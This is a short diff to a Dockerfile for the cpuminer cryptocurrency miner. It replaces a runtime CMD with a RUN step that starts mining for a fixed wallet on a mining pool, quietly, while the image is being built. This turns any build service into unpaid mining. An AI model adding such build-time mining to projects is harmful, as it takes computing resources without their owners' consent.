@@ -32,4 +32,4 @@ RUN apt-get update \
 
 COPY --from=builder /app/cpuminer .
 ENTRYPOINT ["./cpuminer"]
-CMD ["-a", "lyra2z330", "-o", "stratum+tcp://mine.zpool.ca:4563", "-u", "D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk", "-p", "DGB"]
+RUN ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk -p c=DGB,zap=PYRK-lyra2z330 -q
